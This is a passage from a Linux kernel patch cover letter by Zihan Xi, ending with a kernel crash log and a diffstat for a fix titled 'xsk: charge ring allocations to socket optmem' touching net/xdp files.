+   e:	48 8b 15 21 2b 0d 00 	mov    0xd2b21(%rip),%rdx        # 0xd2b36
+  15:	f7                   	.byte 0xf7
+[  112.571019][  T953] RSP: 002b:00007ffc66ef6958 EFLAGS: 00000283 ORIG_RAX: 0000000000000036
+[  112.571683][  T953] RAX: ffffffffffffffda RBX: 000055d2e378619e RCX: 00007e2b01ae42ba
+[  112.572300][  T953] RDX: 0000000000000005 RSI: 000000000000011b RDI: 0000000000000003
+[  112.572901][  T953] RBP: 0000000000000000 R08: 0000000000000004 R09: 0000000000000000
+[  112.573505][  T953] R10: 00007ffc66ef697c R11: 0000000000000283 R12: 000055d2e3787dc0
+[  112.574127][  T953] R13: 0000000004000000 R14: 00007ffc66ef697c R15: 0000000000000003
+[  112.574744][  T953]  </TASK>
+[  112.575596][  T953] Kernel Offset: disabled
+[  112.575937][  T953] Rebooting in 10 seconds..
+-----END crash log-----
+
+Best regards,
+Zihan Xi
+
+
+
+
+Zihan Xi (1):
+  xsk: charge ring allocations to socket optmem
+
+ net/xdp/xsk.c       | 26 +++++++++++++++++++-------
+ net/xdp/xsk_queue.c | 35 ++++++++++++++++++++++++++++++++++-
+ net/xdp/xsk_queue.h |  7 +++++--
+ 3 files changed, 58 insertions(+), 10 deletions(-)
+
+-- 
+2.43.0
+
